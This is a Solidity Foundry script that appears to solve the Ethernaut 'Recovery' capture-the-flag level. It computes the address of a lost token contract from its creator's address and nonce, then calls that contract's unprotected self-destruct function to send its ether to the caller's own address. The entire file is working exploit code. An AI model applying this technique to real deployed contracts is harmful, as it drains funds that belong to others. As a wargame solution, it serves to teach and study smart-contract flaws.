// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract RecoverySolution is Script {
    address Instance = 0x0E1a8DF39DAD723f834AeB46E167262825DBB168;

    function run() external {
        vm.startBroadcast();
        Hack hack = new Hack();
        hack.attack(Instance, vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}

interface ISimpleToken {
    function destory(address payable sender) external;
}

contract Hack {
    function recover(address sender) public pure returns (address) {
        address addr =
            address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01))))));
        return addr;
    }

    function attack(address sender, address to) external {
        ISimpleToken(recover(sender)).destory(payable(to));
    }
}
